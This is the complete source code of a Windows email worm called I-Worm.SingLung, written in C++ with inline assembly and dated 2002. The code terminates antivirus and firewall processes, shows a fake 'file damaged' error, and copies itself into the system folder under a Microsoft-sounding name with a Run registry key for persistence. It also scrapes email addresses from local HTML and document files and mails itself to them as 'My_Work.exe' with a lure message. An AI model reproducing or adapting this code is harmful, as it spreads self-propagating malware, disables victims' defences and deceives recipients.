/*
Name : I-Worm.SingLung
Author : PetiK
Date : January 23rd 2002 - January 26th 2002
Language : C++/Win32asm

Greetz to Bumblebee (I-Worm.Plage and I-Worm.Rundll);
*/

#include <stdio.h>
#include <windows.h>
#include <mapi.h>
#include <tlhelp32.h>
#pragma argused
#pragma inline


char 	filename[100],sysdir[100],sysdr[100],winhtm[100];
LPSTR 	Run="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
	SHFolder=".DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
int	i;
HANDLE	fd,lSnapshot,myproc;
BOOL	rProcessFound;
BYTE	desktop[50],favoris[50],personal[50],cache[50];
DWORD	sizcache=sizeof(desktop),sizfavoris=sizeof(favoris),
	sizpersonal=sizeof(personal),sizdesktop=sizeof(cache);
DWORD	type=REG_SZ;
FILE	*stopv;

LHANDLE session;
MapiMessage mess;
MapiRecipDesc from;
HINSTANCE hMAPI;

HKEY		hReg;
PROCESSENTRY32 	uProcess;
SYSTEMTIME	systime;
WIN32_FIND_DATA	ffile;
HDC		dc;

void Welcome();
void StopAV(char *);
void FindFile(char *,char *);
void GetMail(char *,char *);
void sendmail(char *);
void FeedBack();

//ULONG (PASCAL FAR *RegSerPro)(ULONG, ULONG);
ULONG (PASCAL FAR *mSendMail)(ULONG, ULONG, MapiMessage*, FLAGS, ULONG);


int WINAPI WinMain (HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
	/*
	// Worm in RegisterServiceProcess
	HMODULE kern32=GetModuleHandle("KERNEL32.DLL");
	if(kern32) {
		(FARPROC &)RegSerPro=GetProcAddress(kern32,"RegisterServiceProcess");
		if(RegSerPro)
		RegSerPro(NULL,1);
	}	*/

// Fuck some AntiVirus hahahaha
StopAV("AVP32.EXE");		// AVP
StopAV("AVPCC.EXE");		// AVP
StopAV("AVPM.EXE");		// AVP
StopAV("WFINDV32.EXE");		// Dr. Solomon
StopAV("F-AGNT95.EXE");		// F-Secure
StopAV("NAVAPW32.EXE");		// Norton Antivirus
StopAV("NAVW32.EXE");		// Norton Antivirus
StopAV("NMAIN.EXE");		// Norton Antivirus
StopAV("PAVSCHED.EXE");		// Panda AntiVirus
StopAV("ZONEALARM.EXE");	// ZoneAlarm

GetModuleFileName(hInst,filename,100);
GetSystemDirectory((char *)sysdir,100);

strcpy(sysdr,sysdir);
strcat(sysdr,"\\MSGDI32.EXE");
if((lstrcmp(filename,sysdr))!=0) {
	Welcome();
	}
else
	{
	hMAPI=LoadLibrary("MAPI32.DLL");
	(FARPROC &)mSendMail=GetProcAddress(hMAPI, "MAPISendMail");
	RegOpenKeyEx(HKEY_USERS,SHFolder,0,KEY_QUERY_VALUE,&hReg);
	RegQueryValueEx(hReg,"Desktop",0,&type,desktop,&sizdesktop);
	RegQueryValueEx(hReg,"Favorites",0,&type,favoris,&sizfavoris);
	RegQueryValueEx(hReg,"Personal",0,&type,personal,&sizpersonal);
	RegQueryValueEx(hReg,"Cache",0,&type,cache,&sizcache);
	RegCloseKey(hReg);
	GetWindowsDirectory((char *)winhtm,100);

_asm
{
call	@wininet
db	"WININET.DLL",0
@wininet:
call	LoadLibrary
test	eax,eax
jz	end_asm
mov	ebp,eax
call	@inetconnect
db	"InternetGetConnectedState",0
@inetconnect:
push	ebp
call	GetProcAddress
test	eax,eax
jz	end_wininet
mov	edi,eax
verf:
push	0
push	Tmp
call	edi
dec	eax
jnz	verf

end_wininet:
push	ebp
call	FreeLibrary
end_asm:
jmp	end_all_asm

Tmp	dd 0

end_all_asm:
}

	FindFile(desktop,"*.htm");
	FindFile(favoris,"*.ht*");
	FindFile(personal,"*.ht*");
	FindFile(personal,"*.doc");
	FindFile(winhtm,".ht*");
	FindFile(cache,".ht*");
	FreeLibrary(hMAPI);
	FeedBack();
	}

strcat(sysdir,"\\MsGDI32.exe");
CopyFile(filename,sysdir,FALSE);
RegOpenKeyEx(HKEY_LOCAL_MACHINE,Run,0,KEY_WRITE,&hReg);
RegSetValueEx(hReg,"Microsoft GDI 32 bits",0,REG_SZ,(BYTE *)sysdir,100);
RegCloseKey(hReg);

}

void Welcome()
{
register char fileWel[100],messWel[25],titWel[25];
strcpy(fileWel,filename);
fileWel[0]=0;
for(i=strlen(filename);i>0 && filename[i]!='\\';i--);
wsprintf(titWel,"Error - %s",fileWel+i+1);
wsprintf(messWel,"File - %s - damaged.\nCannot open this file.",fileWel+i+1);
MessageBox(NULL,messWel,titWel,MB_OK|MB_ICONHAND);
}


void StopAV(char *antivirus)
{
register BOOL term;
lSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
uProcess.dwSize=sizeof(uProcess);
rProcessFound=Process32First(lSnapshot,&uProcess);
while(rProcessFound) {
	if(strstr(uProcess.szExeFile,antivirus)!=NULL) {	// Norton Antivirus
		myproc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,uProcess.th32ProcessID);
		if(myproc!=NULL) {
			term=TerminateProcess(myproc,0);
		}
		CloseHandle(myproc);
	}
	rProcessFound=Process32Next(lSnapshot,&uProcess);
}
CloseHandle(lSnapshot);
}


void FindFile(char *folder, char *ext)
{
register bool abc=TRUE;
register HANDLE hFile;
char mail[128];
SetCurrentDirectory(folder);
hFile=FindFirstFile(ext,&ffile);
if(hFile!=INVALID_HANDLE_VALUE) {
	while(abc) {
	SetFileAttributes(ffile.cFileName,FILE_ATTRIBUTE_ARCHIVE);
	GetMail(ffile.cFileName,mail);
	if(strlen(mail)>0) {
	WritePrivateProfileString("EMail found",mail,"send","singlung.txt");
	sendmail(mail);
	}
	abc=FindNextFile(hFile,&ffile);
	}
}

}

void GetMail(char *namefile, char *mail)
{
HANDLE	hf,hf2;
char	*mapped;
DWORD	size,i,k;
BOOL	test=FALSE,valid=FALSE;
mail[0]=0;

hf=CreateFile(namefile,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,0);
if(hf==INVALID_HANDLE_VALUE)
	return;
size=GetFileSize(hf,NULL);
if(!size)
	return;
if(size<8)
	return;
size-=100;

hf2=CreateFileMapping(hf,0,PAGE_READONLY,0,0,0);
if(!hf2) {
	CloseHandle(hf);
	return;
	}

mapped=(char *)MapViewOfFile(hf2,FILE_MAP_READ,0,0,0);
if(!mapped) {
	CloseHandle(hf2);
	CloseHandle(hf);
	return;
	}

i=0;
while(i<size && !test) {
if(!strncmpi("mailto:",mapped+i,strlen("mailto:"))) {
	test=TRUE;
	i+=strlen("mailto:");
	k=0;
	while(mapped[i]!=34 && mapped[i]!=39 && i<size && k<127) {
		if(mapped[i]!=' ') {
			mail[k]=mapped[i];
			k++;
			if(mapped[i]=='@')
				valid=TRUE;
		}
		i++;
	}
	mail[k]=0;
	} else
	i++;
}

if(!valid)
	mail[0]=0;
UnmapViewOfFile(mapped);
CloseHandle(hf2);
CloseHandle(hf);
return;
}

void sendmail(char *tos)
{
memset(&mess,0,sizeof(MapiMessage));
memset(&from,0,sizeof(MapiRecipDesc));

from.lpszName=NULL;
from.ulRecipClass=MAPI_ORIG;
mess.lpszSubject="Secret for you...";
mess.lpszNoteText="Hi Friend,\n\n"
		"I send you my last work.\n"
		"Mail me if you have some suggests.\n\n"
		"	See you soon. Best Regards.";

mess.lpRecips=(MapiRecipDesc *)malloc(sizeof(MapiRecipDesc));
	if(!mess.lpRecips)
	return;
memset(mess.lpRecips,0,sizeof(MapiRecipDesc));
mess.lpRecips->lpszName=tos;
mess.lpRecips->lpszAddress=tos;
mess.lpRecips->ulRecipClass=MAPI_TO;
mess.nRecipCount=1;

mess.lpFiles=(MapiFileDesc *)malloc(sizeof(MapiFileDesc));
	if(!mess.lpFiles)
	return;
memset(mess.lpFiles,0,sizeof(MapiFileDesc));
mess.lpFiles->lpszPathName=filename;
mess.lpFiles->lpszFileName="My_Work.exe";
mess.nFileCount=1;

mess.lpOriginator=&from;

mSendMail(0,0,&mess,0,0);

free(mess.lpRecips);
free(mess.lpFiles);
}


void FeedBack()
{
GetSystemTime(&systime);
switch(systime.wDay) {
case 7:
	MessageBox(NULL,"It is not with a B-52 that you will stop terrorist groups.\n"
			"With this, you stop the life of women and children.",
			"Message to USA",MB_OK|MB_ICONHAND);
	break;

case 11:
	dc=GetDC(NULL);
	if(dc)
	{
	TextOut(dc,300,300,"Can we try to stop the conflicts ? YES OF COURSE !",50);
	}
	ReleaseDC(NULL,dc);
	break;

case 28:
	stopv=fopen("StopIntifada.htm","w");
	fprintf(stopv,"<html><head><title>Stop Violence between Palestinians and Israeli</title></head>\n");
	fprintf(stopv,"<body bgcolor=blue text=yellow>\n");
	fprintf(stopv,"<p align=\"center\"><font size=\"5\">HOW TO STOP THE VIOLENCE</font></p><BR>\n");
	fprintf(stopv,"<p align=\"left\"><font size=\"3\">-THE ISRAELIS:</font><BR>\n");
	fprintf(stopv,"<font>To take the israelis tank out of the palestinians autonomous city.</font><BR>\n");
	fprintf(stopv,"<font>Don't bomb civil place after a terrorist bomb attack.</font><BR>\n");
	fprintf(stopv,"<font>To arrest and to kill the leaders of terrorist groups.</font><BR><BR>\n");
	fprintf(stopv,"<font>-THE PALESTINIANS:</font><BR>\n");
	fprintf(stopv,"<font>To stop to provoke the israelis army.</font><BR>\n");
	fprintf(stopv,"<font>To stop the terrorist attacks.</font><BR><BR>\n");
	fprintf(stopv,"<font>-THE BOTH:</font><BR>\n");
	fprintf(stopv,"<font>To try to accept the other people.</font><BR>\n");
	fprintf(stopv,"<font>TO ORGANIZE A MEETING BETWEEN ARIEL SHARON AND YASSER ARAFAT !</font><BR><BR>\n");
	fprintf(stopv,"<font>Thanx to read this.</font></p>\n");
	fprintf(stopv,"</body></html>");
	fclose(stopv);
	ShellExecute(NULL,"open","StopIntifada.htm",NULL,NULL,SW_SHOWMAXIMIZED);
	
	break;
}
}